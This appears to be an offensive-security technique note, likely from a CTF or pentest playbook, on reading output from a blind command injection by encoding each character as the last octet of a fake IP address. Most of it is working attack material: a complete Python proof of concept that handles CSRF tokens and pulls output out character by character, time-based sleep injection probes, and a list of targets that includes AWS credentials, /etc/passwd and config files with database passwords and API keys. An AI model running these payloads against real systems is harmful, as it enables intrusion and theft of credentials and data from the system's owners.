# Blind RCE Output Exfiltration via IP-Format Encoding

## Trigger
- Confirmed blind command injection (time-based: sleep causes delay)
- Application only displays output matching IP address regex pattern
- Cannot write to webroot (permission denied)
- No outbound callback possible (firewalled)

## Technique: Printf IP Octet Encoding

### Concept
The target app parses command output for IP-like patterns (X.X.X.X). Encode each character's
ASCII value as the last octet of a fake IP to exfiltrate data one char at a time.

### Single-Char Exfiltration
```
;printf "1.1.1.%d" "'$(COMMAND|cut -cN)"
```
The `'X` syntax in printf gives the ASCII value of character X.

### Python PoC
```python
import requests, re, urllib3
urllib3.disable_warnings()

s = requests.Session()
s.verify = False
BASE = "https://target:8000"

def inject(cmd):
    r = s.get(f'{BASE}/')
    token = re.search(r'name="token"[^>]*value="([^"]+)"', r.text).group(1)
    r = s.post(f'{BASE}/', data={'domain': cmd, 'token': token})
    m = re.search(r'margin-top: 10px;">(.*?)</div>', r.text, re.DOTALL)
    return m.group(1).strip() if m else 'NO OUTPUT'

def exfil(cmd, max_len=100):
    output = ""
    for i in range(1, max_len+1):
        payload = ';printf "1.1.1.%d" "\'$(' + cmd + '|cut -c' + str(i) + ')"'
        r = inject(payload)
        if "IP Address:" in r:
            val = int(r.replace("IP Address:", "").strip().split(".")[-1])
            if val == 0:
                break
            output += chr(val)
        else:
            break
    return output

print(exfil("whoami"))       # www-data
print(exfil("pwd"))          # /var/www/html
print(exfil("cat /etc/hostname"))
```

### Performance
- ~1 request per character (slow but reliable)
- Typical: 60 chars/minute
- Use for short outputs: whoami, pwd, ls, env|grep X, find results

### Faster Alternative: 4 Bytes Per Request
```
;X=$(CMD);printf "%d.%d.%d.%d" "'$(echo $X|cut -c1)" "'$(echo $X|cut -c2)" "'$(echo $X|cut -c3)" "'$(echo $X|cut -c4)"
```
Each IP octet carries one character — 4x faster but quoting is complex.

## Detection of Injection Point

### Time-Based Confirmation
```python
# Baseline
inject('google.com')           # ~0.3s

# Injection tests
inject('google.com;sleep 3')   # ~3.3s = semicolon works
inject('google.com|sleep 3')   # ~3.3s = pipe works  
inject('google.com && sleep 3') # ~3.3s = AND works
```

### When App Only Shows IP Format
- Normal domain → "IP Address: X.X.X.X"
- Invalid/no-IP output → "No valid IP address found" or "No IP address found for the domain"
- Key: inject `;printf "1.2.3.4"` → if shows "IP Address: 1.2.3.4", output reflection works

## Common Targets for Exfiltration
1. `whoami` — confirm user context
2. `pwd` — find webroot
3. `ls /var/www/html` — enumerate app files
4. `env|grep -i aws` — AWS credentials
5. `cat /etc/passwd|grep -v nologin` — real users
6. `find / -name '*flag*' 2>/dev/null` — CTF flags
7. `cat /var/www/html/config.php` — DB creds, API keys

## Pitfalls
- char-by-char is SLOW — prioritize short commands, use grep/cut/head to narrow output
- Some shells interpret `'$()` differently — test with known output first
- If write to webroot works, always prefer webshell over char-by-char exfil
- Token/CSRF rotation: must GET fresh page before each POST (token consumed per request)
